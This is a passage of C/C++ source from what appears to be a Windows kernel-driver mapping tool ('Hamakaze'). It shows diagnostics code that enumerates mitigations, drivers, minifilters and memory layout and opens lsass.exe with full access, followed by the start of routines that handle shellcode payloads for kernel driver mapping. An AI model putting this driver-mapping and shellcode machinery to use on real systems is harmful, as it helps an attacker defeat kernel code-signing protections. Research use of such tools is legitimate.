        printf_s("\t\t%s %s\r\n%s", Name, Value ? PRINTGRN"TRUE" : PRINTWHT"FALSE", PRINTWHT);

    }
    else {

        printf_s("\t\t%s %s\r\n", Name, Value ? "TRUE" : "FALSE");

    }
}

VOID KDUQuerySpecMitigationState()
{
    union {
        SYSTEM_SPECULATION_CONTROL_INFORMATION v1;
        SYSTEM_SPECULATION_CONTROL_INFORMATION_V2 v2;
    } SpecControlInfo;

    SYSTEM_KERNEL_VA_SHADOW_INFORMATION KvaShadowInfo;

    DWORD bytesIO = 0;

    RtlSecureZeroMemory(&KvaShadowInfo, sizeof(KvaShadowInfo));

    NTSTATUS ntStatus = NtQuerySystemInformation(SystemKernelVaShadowInformation, &KvaShadowInfo, sizeof(KvaShadowInfo), &bytesIO);

    if (NT_SUCCESS(ntStatus)) {

        printf_s("\t>> SystemKernelVaShadowInformation\r\n");
        KDUPrintBooleanValueWithColor("KvaShadowEnabled", KvaShadowInfo.KvaShadowFlags.KvaShadowEnabled);
        KDUPrintBooleanValueWithColor("KvaShadowUserGlobal", KvaShadowInfo.KvaShadowFlags.KvaShadowUserGlobal);
        KDUPrintBooleanValueWithColor("KvaShadowPcid", KvaShadowInfo.KvaShadowFlags.KvaShadowPcid);
        KDUPrintBooleanValueWithColor("KvaShadowInvpcid", KvaShadowInfo.KvaShadowFlags.KvaShadowInvpcid);
        KDUPrintBooleanValueWithColor("KvaShadowRequired", KvaShadowInfo.KvaShadowFlags.KvaShadowRequired);
        KDUPrintBooleanValueWithColor("KvaShadowRequiredAvailable", KvaShadowInfo.KvaShadowFlags.KvaShadowRequiredAvailable);
        printf_s("\tInvalidPteBit %lu\r\n", KvaShadowInfo.KvaShadowFlags.InvalidPteBit);
        KDUPrintBooleanValueWithColor("L1DataCacheFlushSupported", KvaShadowInfo.KvaShadowFlags.L1DataCacheFlushSupported);
        KDUPrintBooleanValueWithColor("L1TerminalFaultMitigationPresent", KvaShadowInfo.KvaShadowFlags.L1TerminalFaultMitigationPresent);

    }
    else {
        supShowHardError("Cannot query Kernel VA Shadow information", ntStatus);
    }

    RtlSecureZeroMemory(&SpecControlInfo, sizeof(SpecControlInfo));

    bytesIO = sizeof(SpecControlInfo);
    ntStatus = NtQuerySystemInformation(SystemSpeculationControlInformation, &SpecControlInfo, bytesIO, &bytesIO);

    if (ntStatus == STATUS_NOT_IMPLEMENTED ||
        ntStatus == STATUS_INVALID_INFO_CLASS)
    {
        supShowHardError("Speculation control information class not present", ntStatus);
    }
    else if (ntStatus != STATUS_SUCCESS) {
        supShowHardError("Cannot query speculation control information", ntStatus);
    }
    else {

        if (bytesIO != sizeof(SYSTEM_SPECULATION_CONTROL_INFORMATION_V2) &&
            bytesIO != sizeof(SYSTEM_SPECULATION_CONTROL_INFORMATION)) {
            supPrintfEvent(kduEventError,
                "Unknown speculation control information size %lu\r\n", bytesIO);
        }

        printf_s("\t>> SystemSpeculationControlInformation\r\n");

        KDUPrintBooleanValueWithColor("BpbEnabled", SpecControlInfo.v1.SpeculationControlFlags.BpbEnabled);
        KDUPrintBooleanValueWithColor("BpbDisabledSystemPolicy", SpecControlInfo.v1.SpeculationControlFlags.BpbDisabledSystemPolicy);
        KDUPrintBooleanValueWithColor("BpbDisabledNoHardwareSupport", SpecControlInfo.v1.SpeculationControlFlags.BpbDisabledNoHardwareSupport);
        KDUPrintBooleanValueWithColor("SpecCtrlEnumerated", SpecControlInfo.v1.SpeculationControlFlags.SpecCtrlEnumerated);
        KDUPrintBooleanValueWithColor("SpecCmdEnumerated", SpecControlInfo.v1.SpeculationControlFlags.SpecCmdEnumerated);
        KDUPrintBooleanValueWithColor("IbrsPresent", SpecControlInfo.v1.SpeculationControlFlags.IbrsPresent);
        KDUPrintBooleanValueWithColor("StibpPresent", SpecControlInfo.v1.SpeculationControlFlags.StibpPresent);
        KDUPrintBooleanValueWithColor("SmepPresent", SpecControlInfo.v1.SpeculationControlFlags.SmepPresent);
        KDUPrintBooleanValueWithColor("SpeculativeStoreBypassDisableAvailable", SpecControlInfo.v1.SpeculationControlFlags.SpeculativeStoreBypassDisableAvailable);
        KDUPrintBooleanValueWithColor("SpeculativeStoreBypassDisableSupported", SpecControlInfo.v1.SpeculationControlFlags.SpeculativeStoreBypassDisableSupported);
        KDUPrintBooleanValueWithColor("SpeculativeStoreBypassDisabledSystemWide", SpecControlInfo.v1.SpeculationControlFlags.SpeculativeStoreBypassDisabledSystemWide);
        KDUPrintBooleanValueWithColor("SpeculativeStoreBypassDisabledKernel", SpecControlInfo.v1.SpeculationControlFlags.SpeculativeStoreBypassDisabledKernel);
        KDUPrintBooleanValueWithColor("SpeculativeStoreBypassDisableRequired", SpecControlInfo.v1.SpeculationControlFlags.SpeculativeStoreBypassDisableRequired);
        KDUPrintBooleanValueWithColor("BpbDisabledKernelToUser", SpecControlInfo.v1.SpeculationControlFlags.BpbDisabledKernelToUser);
        KDUPrintBooleanValueWithColor("SpecCtrlRetpolineEnabled", SpecControlInfo.v1.SpeculationControlFlags.SpecCtrlRetpolineEnabled);
        KDUPrintBooleanValueWithColor("SpecCtrlImportOptimizationEnabled", SpecControlInfo.v1.SpeculationControlFlags.SpecCtrlImportOptimizationEnabled);
        KDUPrintBooleanValueWithColor("EnhancedIbrs", SpecControlInfo.v1.SpeculationControlFlags.EnhancedIbrs);
        KDUPrintBooleanValueWithColor("HvL1tfStatusAvailable", SpecControlInfo.v1.SpeculationControlFlags.HvL1tfStatusAvailable);
        KDUPrintBooleanValueWithColor("HvL1tfProcessorNotAffected", SpecControlInfo.v1.SpeculationControlFlags.HvL1tfProcessorNotAffected);
        KDUPrintBooleanValueWithColor("HvL1tfMigitationEnabled", SpecControlInfo.v1.SpeculationControlFlags.HvL1tfMigitationEnabled);
        KDUPrintBooleanValueWithColor("HvL1tfMigitationNotEnabled_Hardware", SpecControlInfo.v1.SpeculationControlFlags.HvL1tfMigitationNotEnabled_Hardware);
        KDUPrintBooleanValueWithColor("HvL1tfMigitationNotEnabled_LoadOption", SpecControlInfo.v1.SpeculationControlFlags.HvL1tfMigitationNotEnabled_LoadOption);
        KDUPrintBooleanValueWithColor("HvL1tfMigitationNotEnabled_CoreScheduler", SpecControlInfo.v1.SpeculationControlFlags.HvL1tfMigitationNotEnabled_CoreScheduler);
        KDUPrintBooleanValueWithColor("EnhancedIbrsReported", SpecControlInfo.v1.SpeculationControlFlags.EnhancedIbrsReported);
        KDUPrintBooleanValueWithColor("MdsHardwareProtected", SpecControlInfo.v1.SpeculationControlFlags.MdsHardwareProtected);
        KDUPrintBooleanValueWithColor("MbClearEnabled", SpecControlInfo.v1.SpeculationControlFlags.MbClearEnabled);
        KDUPrintBooleanValueWithColor("MbClearReported", SpecControlInfo.v1.SpeculationControlFlags.MbClearReported);
        printf_s("\t\tTsxCtrlStatus %lu\r\n", SpecControlInfo.v1.SpeculationControlFlags.TsxCtrlStatus);
        KDUPrintBooleanValueWithColor("TsxCtrlReported", SpecControlInfo.v1.SpeculationControlFlags.TsxCtrlReported);
        KDUPrintBooleanValueWithColor("TaaHardwareImmune", SpecControlInfo.v1.SpeculationControlFlags.TaaHardwareImmune);

        if (bytesIO == sizeof(SYSTEM_SPECULATION_CONTROL_INFORMATION_V2)) {

            printf_s("\t>> SystemSpeculationControlInformation v2\r\n");

            KDUPrintBooleanValueWithColor("SbdrSsdpHardwareProtected", SpecControlInfo.v2.SpeculationControlFlags2.SbdrSsdpHardwareProtected);
            KDUPrintBooleanValueWithColor("FbsdpHardwareProtected", SpecControlInfo.v2.SpeculationControlFlags2.FbsdpHardwareProtected);
            KDUPrintBooleanValueWithColor("PsdpHardwareProtected", SpecControlInfo.v2.SpeculationControlFlags2.PsdpHardwareProtected);
            KDUPrintBooleanValueWithColor("FbClearEnabled", SpecControlInfo.v2.SpeculationControlFlags2.FbClearEnabled);
            KDUPrintBooleanValueWithColor("FbClearReported", SpecControlInfo.v2.SpeculationControlFlags2.FbClearReported);
        }
    }
}

#define WATCH_COUNT 256

VOID KDUQueryProcessWorkingSet(
    _In_ ULONG_PTR SystemRangeStart,
    _In_ PRTL_PROCESS_MODULES pvModules
)
{
    NTSTATUS ntStatus;

    ntStatus = NtSetInformationProcess(
        NtCurrentProcess(),
        ProcessWorkingSetWatch,
        NULL,
        0);

    if (!NT_SUCCESS(ntStatus)) {
        supShowHardError("Cannot enable ws watch", ntStatus);
        return;
    }

    PROCESS_WS_WATCH_INFORMATION_EX watchInfo[WATCH_COUNT];

    RtlSecureZeroMemory(&watchInfo, sizeof(watchInfo));

    ntStatus = EmptyWorkingSet();
    if (!NT_SUCCESS(ntStatus)) {
        supShowHardError("Error at EmptyWorkingSet", ntStatus);
        return;
    }

    ntStatus = NtQueryInformationProcess(
        NtCurrentProcess(),
        ProcessWorkingSetWatchEx,
        (PVOID*)&watchInfo,
        sizeof(watchInfo),
        NULL);

    if (!NT_SUCCESS(ntStatus)) {
        supShowHardError("Error at working set changes query", ntStatus);
        return;
    }

    PVOID cookie;
    ntStatus = LdrLockLoaderLock(LDR_LOCK_LOADER_LOCK_FLAG_RAISE_ON_ERRORS, NULL, &cookie);

    if (NT_SUCCESS(ntStatus)) {

        PLDR_DATA_TABLE_ENTRY entry;
        UNICODE_STRING moduleUnknown;
        RtlInitUnicodeString(&moduleUnknown, L"Unknown");

        for (ULONG i = 0; i < WATCH_COUNT; i++) {

            PVOID faultingPc = watchInfo[i].BasicInfo.FaultingPc;
            PVOID faultingVa = watchInfo[i].BasicInfo.FaultingVa;

            if (faultingPc == NULL || faultingVa == NULL)
                continue;

            PWSTR pcName = moduleUnknown.Buffer, vaName = moduleUnknown.Buffer;
            ULONG moduleIndex;
            UNICODE_STRING pcModuleName, vaModuleName;

            RtlInitEmptyUnicodeString(&pcModuleName, NULL, 0);
            RtlInitEmptyUnicodeString(&vaModuleName, NULL, 0);

            if ((ULONG_PTR)faultingPc >= SystemRangeStart) {

                moduleIndex = 0;

                if (supFindModuleEntryByAddress(pvModules,
                    faultingPc,
                    &moduleIndex))
                {
                    if (NT_SUCCESS(ntsupConvertToUnicode(
                        (LPCSTR)pvModules->Modules[moduleIndex].FullPathName,
                        &pcModuleName)))
                    {
                        pcName = pcModuleName.Buffer;
                    }
                }

            }
            else {

                ntStatus = LdrFindEntryForAddress(faultingPc, (PLDR_DATA_TABLE_ENTRY*)&entry);
                if (NT_SUCCESS(ntStatus))
                    pcName = entry->BaseDllName.Buffer;

            }

            if ((ULONG_PTR)faultingVa >= SystemRangeStart) {

                moduleIndex = 0;

                if (supFindModuleEntryByAddress(pvModules,
                    faultingVa,
                    &moduleIndex))
                {
                    if (NT_SUCCESS(ntsupConvertToUnicode(
                        (LPCSTR)pvModules->Modules[moduleIndex].FullPathName,
                        &vaModuleName)))
                    {
                        vaName = vaModuleName.Buffer;
                    }
                }

            }
            else {

                ntStatus = LdrFindEntryForAddress(faultingVa, (PLDR_DATA_TABLE_ENTRY*)&entry);
                if (NT_SUCCESS(ntStatus))
                    vaName = entry->BaseDllName.Buffer;

            }

            printf_s("\t>> ThreadId [%llu] Pc %p (%ws) : Va %p (%ws)\r\n",
                watchInfo[i].FaultingThreadId,
                faultingPc,
                pcName,
                faultingVa,
                vaName);

            if (pcModuleName.Buffer) RtlFreeUnicodeString(&pcModuleName);
            if (vaModuleName.Buffer) RtlFreeUnicodeString(&vaModuleName);

        }

        LdrUnlockLoaderLock(LDR_UNLOCK_LOADER_LOCK_FLAG_RAISE_ON_ERRORS, cookie);
    }
    else {
        supShowHardError("Failed acquire loader lock", ntStatus);
    }
}

VOID TraceHandle(
    _In_ ULONG_PTR SystemRangeStart,
    _In_ HANDLE Handle,
    _In_ PRTL_PROCESS_MODULES pvModules
)
{
    NTSTATUS ntStatus;
    PROCESS_HANDLE_TRACING_QUERY trace;

    RtlSecureZeroMemory(&trace, sizeof(trace));
    trace.Handle = Handle;

    ntStatus = NtQueryInformationProcess(NtCurrentProcess(), ProcessHandleTracing, &trace, sizeof(trace), NULL);
    if (NT_SUCCESS(ntStatus)) {

        for (ULONG i = 0; i < trace.TotalTraces; i++) {
            for (ULONG j = 0; j < PROCESS_HANDLE_TRACING_MAX_STACKS; j++) {

                ULONG moduleIndex = 0;
                PVOID stackAddress = trace.HandleTrace[i].Stacks[j];

                if (stackAddress == NULL)
                    continue;

                if (supFindModuleEntryByAddress(pvModules,
                    stackAddress,
                    &moduleIndex))
                {

                    printf_s("\t>> 0x%p, %s, base 0x%p\r\n",
                        stackAddress,
                        pvModules->Modules[moduleIndex].FullPathName,
                        pvModules->Modules[moduleIndex].ImageBase);

                }
                else {
                    if ((ULONG_PTR)stackAddress >= SystemRangeStart) {
                        printf_s("\t>> 0x%p, !UNKNOWN! module\r\n",
                            stackAddress);
                    }
                    else {

                        PVOID cookie = NULL;
                        ntStatus = LdrLockLoaderLock(LDR_LOCK_LOADER_LOCK_FLAG_RAISE_ON_ERRORS, NULL, &cookie);

                        if (NT_SUCCESS(ntStatus)) {

                            PLDR_DATA_TABLE_ENTRY entry;

                            ntStatus = LdrFindEntryForAddress(stackAddress, (PLDR_DATA_TABLE_ENTRY*)&entry);
                            if (NT_SUCCESS(ntStatus)) {
                                printf_s("\t>> 0x%p, %wZ, base 0x%p\r\n",
                                    stackAddress,
                                    entry->BaseDllName,
                                    entry->DllBase);
                            }
                            else {
                                printf_s("\t>> 0x%p, !UNKNOWN! module\r\n",
                                    stackAddress);
                            }

                            LdrUnlockLoaderLock(LDR_UNLOCK_LOADER_LOCK_FLAG_RAISE_ON_ERRORS, cookie);
                        }
                        else {
                            supShowHardError("Failed to acquire loader lock", ntStatus);
                        }

                    }
                }

            }
        }

    }
    else {
        supShowHardError("Cannot query trace", ntStatus);
    }
}

VOID TracePsHandle(
    _In_ PCLIENT_ID ClientId,
    _In_ ULONG_PTR SystemRangeStart,
    _In_ PRTL_PROCESS_MODULES pvModules,
    _In_ BOOL TraceThread
)
{
    NTSTATUS ntStatus;
    HANDLE objectHandle = NULL;
    CLIENT_ID clientId;
    OBJECT_ATTRIBUTES obja;

    if (ClientId->UniqueProcess == NtCurrentTeb()->ClientId.UniqueProcess) {
        printf_s("> Process (self) handle trace\r\n");
    }
    else {
        printf_s("> Process (%lu) handle trace\r\n", HandleToULong(ClientId->UniqueProcess));
    }

    clientId = *ClientId;

    InitializeObjectAttributes(&obja, NULL, 0, NULL, NULL);
    ntStatus = NtOpenProcess(&objectHandle, PROCESS_ALL_ACCESS, &obja, &clientId);
    if (NT_SUCCESS(ntStatus)) {
        TraceHandle(
            SystemRangeStart,
            objectHandle,
            pvModules);

        NtClose(objectHandle);
    }
    else {
        supShowHardError("Cannot open process", ntStatus);
    }

    if (!TraceThread)
        return;

    printf_s("> Thread handle trace\r\n");
    clientId = NtCurrentTeb()->ClientId;

    ntStatus = NtOpenThread(&objectHandle, THREAD_ALL_ACCESS, &obja, &clientId);
    if (NT_SUCCESS(ntStatus)) {
        TraceHandle(
            SystemRangeStart,
            objectHandle,
            pvModules);

        NtClose(objectHandle);
    }
    else {
        supShowHardError("Cannot open thread", ntStatus);
    }
}

VOID TraceSectionHandle(
    _In_ ULONG_PTR SystemRangeStart,
    _In_ PRTL_PROCESS_MODULES pvModules
)
{
    NTSTATUS ntStatus;
    HANDLE sectionHandle = NULL, fileHandle = NULL;
    OBJECT_ATTRIBUTES obja;
    UNICODE_STRING usName;
    IO_STATUS_BLOCK iost;

    RtlInitUnicodeString(&usName, L"\\systemroot\\system32\\drivers\\acpi.sys");
    InitializeObjectAttributes(&obja, &usName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    ntStatus = NtOpenFile(&fileHandle,
        SYNCHRONIZE | FILE_EXECUTE,
        &obja,
        &iost,
        FILE_SHARE_READ | FILE_SHARE_DELETE,
        FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT);

    if (!NT_SUCCESS(ntStatus)) {
        supShowHardError("Cannot open test file", ntStatus);
        return;
    }

    RtlInitUnicodeString(&usName, L"\\RPC Control\\zzz");

    ntStatus = NtCreateSection(&sectionHandle,
        SECTION_ALL_ACCESS,
        &obja,
        NULL,
        PAGE_EXECUTE,
        SEC_IMAGE,
        fileHandle);

    if (NT_SUCCESS(ntStatus)) {

        printf_s("> Section handle trace\r\n");
        TraceHandle(SystemRangeStart, sectionHandle, pvModules);

        NtClose(sectionHandle);
    }
    else {
        supShowHardError("Cannot create test section", ntStatus);
    }

    NtClose(fileHandle);
}

#define FLTMGR_LINK_HANDLE_FUNCID 3
#define FLTMGR_FIND_FIRST_FUNCID  9
#define FLTMGR_FIND_NEXT_FUNCID   0xA

#define IOCTL_FLTMGR_LINK_HANDLE    \
    CTL_CODE(FILE_DEVICE_DISK_FILE_SYSTEM, FLTMGR_LINK_HANDLE_FUNCID, METHOD_BUFFERED, FILE_READ_ACCESS)
#define IOCTL_FLTMGR_FIND_FIRST     \
    CTL_CODE(FILE_DEVICE_DISK_FILE_SYSTEM, FLTMGR_FIND_FIRST_FUNCID, METHOD_BUFFERED, FILE_READ_ACCESS)
#define IOCTL_FLTMGR_FIND_NEXT      \
    CTL_CODE(FILE_DEVICE_DISK_FILE_SYSTEM, FLTMGR_FIND_NEXT_FUNCID, METHOD_BUFFERED, FILE_READ_ACCESS)

NTSTATUS KDUpFilterFindFirst(
    _In_ HANDLE FltMgrHandle,
    _In_ FILTER_INFORMATION_CLASS InformationClass,
    _In_ PVOID Buffer,
    _In_ ULONG BufferSize
)
{
    FILTER_INFORMATION_CLASS infoClass = InformationClass;
    NTSTATUS ntStatus;
    DWORD linkInfo[2];

    linkInfo[0] = 3; //type of callback, 3 is for filters.
    linkInfo[1] = 0;

    ntStatus = supFilterDeviceIoControl(FltMgrHandle,
        IOCTL_FLTMGR_LINK_HANDLE,
        &linkInfo,
        sizeof(linkInfo),
        NULL,
        0,
        NULL);

    if (NT_SUCCESS(ntStatus)) {

        ntStatus = supFilterDeviceIoControl(FltMgrHandle,
            IOCTL_FLTMGR_FIND_FIRST,
            &infoClass,
            sizeof(infoClass),
            Buffer,
            BufferSize,
            NULL);

    }

    return ntStatus;
}

NTSTATUS KDUpFilterFindNext(
    _In_ HANDLE FltMgrHandle,
    _In_ FILTER_INFORMATION_CLASS InformationClass,
    _In_ PVOID Buffer,
    _In_ ULONG BufferSize
)
{
    FILTER_INFORMATION_CLASS infoClass = InformationClass;

    return supFilterDeviceIoControl(FltMgrHandle,
        IOCTL_FLTMGR_FIND_NEXT,
        &infoClass,
        sizeof(infoClass),
        Buffer,
        BufferSize,
        NULL);
}

VOID KDUListFilters()
{
    DWORD bufferSize;
    PFILTER_FULL_INFORMATION buffer = NULL;
    HANDLE fltMgrHandle = NULL;
    NTSTATUS ntStatus;
    UNICODE_STRING usDeviceName;
    IO_STATUS_BLOCK iost;
    OBJECT_ATTRIBUTES obja;

    bufferSize = sizeof(FILTER_FULL_INFORMATION) + MAX_PATH * 2;
    buffer = (PFILTER_FULL_INFORMATION)supHeapAlloc((SIZE_T)bufferSize);
    if (buffer) {

        RtlInitUnicodeString(&usDeviceName, L"\\??\\FltMgr");
        InitializeObjectAttributes(&obja, &usDeviceName, OBJ_CASE_INSENSITIVE, NULL, NULL);

        ntStatus = NtCreateFile(&fltMgrHandle,
            GENERIC_READ,
            &obja,
            &iost,
            NULL,
            FILE_ATTRIBUTE_NORMAL,
            FILE_SHARE_READ,
            FILE_OPEN,
            0,
            NULL,
            0);

        if (!NT_SUCCESS(ntStatus)) {
            supPrintfEvent(kduEventError, "Cannot open %wZ, NTSTATUS (0x%lX)\r\n", usDeviceName, ntStatus);
            supHeapFree(buffer);
            return;
        }

        if (NT_SUCCESS(KDUpFilterFindFirst(fltMgrHandle, FilterFullInformation, buffer, bufferSize))) {

            do {

                printf_s("\t>> %ws\r\n", buffer->FilterNameBuffer);
                RtlSecureZeroMemory(buffer, bufferSize);

            } while (KDUpFilterFindNext(fltMgrHandle,
                FilterFullInformation,
                buffer, bufferSize) != STATUS_NO_MORE_ENTRIES);

        }

        NtClose(fltMgrHandle);
        supHeapFree(buffer);
    }
}

VOID KDUBacktraceByHandle(
    _In_ ULONG_PTR SystemRangeStart,
    _In_ PRTL_PROCESS_MODULES pvModules
)
{
    NTSTATUS ntStatus;
    CLIENT_ID cid;
    PVOID procBuffer;
    PROCESS_HANDLE_TRACING_ENABLE traceEnable;
    ULONG nextEntryDelta = 0;
    UNICODE_STRING usLsass;

    union {
        PSYSTEM_PROCESS_INFORMATION Process;
        PBYTE ListRef;
    } List;

    RtlSecureZeroMemory(&traceEnable, sizeof(traceEnable));

    ntStatus = NtSetInformationProcess(NtCurrentProcess(),
        ProcessHandleTracing,
        &traceEnable,
        sizeof(traceEnable));

    if (!NT_SUCCESS(ntStatus)) {
        supShowHardError("Cannot enable backtrace", ntStatus);
        return;
    }

    //
    // Trace self process/thread
    //
    cid.UniqueProcess = NtCurrentTeb()->ClientId.UniqueProcess;
    cid.UniqueThread = NULL;

    TracePsHandle(&cid, SystemRangeStart, pvModules, TRUE);

    //
    // Trace lsass process
    //
    procBuffer = supGetSystemInfo(SystemProcessInformation);

    List.ListRef = (PBYTE)procBuffer;
    if (List.ListRef) {

        RtlInitUnicodeString(&usLsass, L"lsass.exe");

        cid.UniqueProcess = cid.UniqueThread = NULL;

        do {

            List.ListRef += nextEntryDelta;
            if (RtlEqualUnicodeString(&usLsass, &List.Process->ImageName, TRUE)) {
                cid.UniqueProcess = List.Process->UniqueProcessId;
                TracePsHandle(&cid, SystemRangeStart, pvModules, FALSE);
                break;
            }

            nextEntryDelta = List.Process->NextEntryDelta;

        } while (nextEntryDelta);

        supHeapFree(procBuffer);

    }
    else {
        supPrintfEvent(kduEventError, "Cannot allocate process list, process trace unavailable\r\n");
    }

    TraceSectionHandle(SystemRangeStart, pvModules);
}

VOID KDUListObjects(
    VOID
)
{
    OBJENUMPARAM enumParam;
    UNICODE_STRING usObjectType;

    enumParam.ObjectDirectory = (PWSTR)L"\\";
    RtlInitUnicodeString(&usObjectType, L"Device");
    enumParam.ObjectType = &usObjectType;

    supEnumSystemObjects(enumParam.ObjectDirectory, NULL,
        (PENUMOBJECTSCALLBACK)EnumObjectsCallback,
        (PVOID)&enumParam);

    enumParam.ObjectDirectory = (PWSTR)L"\\Device";
    supEnumSystemObjects(enumParam.ObjectDirectory, NULL,
        (PENUMOBJECTSCALLBACK)EnumObjectsCallback,
        (PVOID)&enumParam);

    enumParam.ObjectDirectory = (PWSTR)L"\\Driver";
    RtlInitUnicodeString(&usObjectType, L"Driver");
    enumParam.ObjectType = &usObjectType;
    supEnumSystemObjects(enumParam.ObjectDirectory, NULL,
        (PENUMOBJECTSCALLBACK)EnumObjectsCallback,
        (PVOID)&enumParam);

}

VOID KDUListDrivers(
    _In_ PRTL_PROCESS_MODULES pvModules
)
{
    for (ULONG i = 0; i < pvModules->NumberOfModules; i++) {

        printf_s("\t%lu %p %lu %s\r\n",
            pvModules->Modules[i].LoadOrderIndex,
            pvModules->Modules[i].ImageBase,
            pvModules->Modules[i].ImageSize,
            pvModules->Modules[i].FullPathName);

    }

}

VOID KDUListMemoryLayout()
{
    PCM_FULL_RESOURCE_DESCRIPTOR pDesc;
    PCM_RESOURCE_LIST pList = supQueryPhysicalMemoryLayout();
    PCM_PARTIAL_RESOURCE_DESCRIPTOR pPartialDesc;
    if (pList == NULL)
        return;

    printf_s("ResourceList Count %lx\r\n", pList->Count);
    for (ULONG i = 0; i < pList->Count; i++) {
        pDesc = &pList->List[i];

        printf_s("pDesc[%lu].PartialResourceList.Count %lu\r\n",
            i,
            pDesc->PartialResourceList.Count);

        for (ULONG j = 0; j < pDesc->PartialResourceList.Count; j++) {

            pPartialDesc = &pDesc->PartialResourceList.PartialDescriptors[j];

            if (pPartialDesc->Type == CmResourceTypeMemory ||
                pPartialDesc->Type == CmResourceTypeMemoryLarge)
            {
                ULONGLONG length = pPartialDesc->u.Memory.Length;
                
                switch (pPartialDesc->Flags & CM_RESOURCE_MEMORY_LARGE)
                {
                case CM_RESOURCE_MEMORY_LARGE_40:
                    length <<= 8;
                    break;
                case CM_RESOURCE_MEMORY_LARGE_48:
                    length <<= 16;
                    break;
                case CM_RESOURCE_MEMORY_LARGE_64:
                    length <<= 32;
                    break;
                }

                printf_s("#%lu Flags 0x%04lX 0x%016llX::0x%016llX (length 0x%016llX, %llu Mb)\r\n",
                    j,
                    pPartialDesc->Flags,
                    pPartialDesc->u.Memory.Start.QuadPart,
                    pPartialDesc->u.Memory.Start.QuadPart + length,
                    length,
                    length / 1024 / 1024);

            }
            else {
                printf_s("#%lu Type 0x%04lX, Flags 0x%04lX\r\n", j, pPartialDesc->Type, pPartialDesc->Flags);
            }
        }

    }
    supHeapFree(pList);
}

VOID KDUDiagStart()
{
    PRTL_PROCESS_MODULES pvModules;
    ULONG_PTR systemRangeStart;
    DWORD dwDummy = 0;

    FUNCTION_ENTER_MSG(__FUNCTION__);

    if (!GetConsoleMode(GetStdHandle(STD_OUTPUT_HANDLE), &dwDummy)) {
        g_ConsoleOutput = FALSE;
    }

    //header
    printf_s("[+] Running system diagnostics\r\n");

    __try {

        systemRangeStart = ntsupQuerySystemRangeStart();
        printf_s("> System range start %llX\r\n", systemRangeStart);

        printf_s("> Speculation mitigation state flags\r\n");
        KDUQuerySpecMitigationState();

        pvModules = (PRTL_PROCESS_MODULES)supGetLoadedModulesList(FALSE, NULL);
        if (pvModules) {

            printf_s("> List of loaded drivers\r\n\t[#] [ImageBase] [ImageSize] [FileName]\r\n");
            KDUListDrivers(pvModules);

            printf_s("> List of device and driver objects in the common locations\r\n");
            KDUListObjects();

            KDUBacktraceByHandle(systemRangeStart, pvModules);

            printf_s("> Analyzing process working set\r\n");
            KDUQueryProcessWorkingSet(systemRangeStart, pvModules);

            supHeapFree(pvModules);
        }
        else {
            supPrintfEvent(kduEventError, "Cannot allocate memory\r\n");
        }

        printf_s("> List of registered minifilters\r\n");
        KDUListFilters();

        printf_s("> Physical memory layout\r\n");
        KDUListMemoryLayout();
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        supPrintfEvent(kduEventError, "Exception (0x%lX) during diagnostics\r\n", GetExceptionCode());
    }

    FUNCTION_LEAVE_MSG(__FUNCTION__);
}

```

`Source/Hamakaze/diag.h`:

```h
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2022
*
*  TITLE:       DIAG.H
*
*  VERSION:     1.21
*
*  DATE:        07 Aug 2022
*
*  System diagnostics header file.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#pragma once

VOID KDUDiagStart();

```

`Source/Hamakaze/drvmap.cpp`:

```cpp
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020 - 2025
*
*  TITLE:       DRVMAP.CPP
*
*  VERSION:     1.44
*
*  DATE:        19 Aug 2025
*
*  Driver mapping routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"

/*
* KDUShowPayloadResult
*
* Purpose:
*
* Query and display shellcode result.
*
*/
VOID KDUShowPayloadResult(
    _In_ PKDU_CONTEXT Context,
    _In_ HANDLE SectionHandle
)
{
    NTSTATUS ntStatus;
    ULONG payloadSize = 0;
    SIZE_T viewSize;

    union {
        union {
            PAYLOAD_HEADER_V1* v1;
            PAYLOAD_HEADER_V2* v2;
            PAYLOAD_HEADER_V3* v3;
        } Version;
        PVOID Ref;
    } pvPayloadHead;

    pvPayloadHead.Ref = NULL;

    ScSizeOf(Context->ShellVersion, &payloadSize);
    viewSize = ALIGN_UP_BY(payloadSize, PAGE_SIZE);

    ntStatus = NtMapViewOfSection(SectionHandle,
        NtCurrentProcess(),
        &pvPayloadHead.Ref,
        0,
        PAGE_SIZE,
        NULL,
        &viewSize,
        ViewUnmap,
        0,
        PAGE_READONLY);

    if (NT_SUCCESS(ntStatus) && pvPayloadHead.Ref) {

        switch (Context->ShellVersion) {

        case KDU_SHELLCODE_V2:

            supPrintfEvent(kduEventInformation,
                "[~] Shellcode result, system worker: 0x%p\r\n",
                (PVOID)pvPayloadHead.Version.v1->IoStatus.Information);

            break;

        case KDU_SHELLCODE_V3:
        case KDU_SHELLCODE_V1:
        default:

            supPrintfEvent(kduEventInformation,
                "[~] Shellcode result: NTSTATUS (0x%lX)\r\n", pvPayloadHead.Version.v1->IoStatus.Status);

            break;
        }

        NtUnmapViewOfSection(NtCurrentProcess(), pvPayloadHead.Ref);
    }
    else {

        supPrintfEvent(kduEventError,
            "[!] Cannot map shellcode section, NTSTATUS (%lX)\r\n", ntStatus);

    }
}

/*
* KDUStorePayloadInSection
*
* Purpose:
*
* Load input file as image, resolve import and store result in shared section.
*
*/
BOOL KDUStorePayloadInSection(
    _In_ PKDU_CONTEXT Context,
    _Out_ PHANDLE SectionHandle,
    _Out_ PSIZE_T ViewSize,
    _In_ PVOID ImageBase,
    _In_ ULONG_PTR KernelImage,
    _In_ ULONG_PTR KernelBase
)
{
    BOOL bSuccess = FALSE;
    NTSTATUS ntStatus = STATUS_UNSUCCESSFUL;
    HANDLE sectionHandle = NULL;
    PACL defaultAcl = NULL;
    PVOID pvSharedSection = NULL, dataPtr = NULL;

    PIMAGE_NT_HEADERS ntHeader;

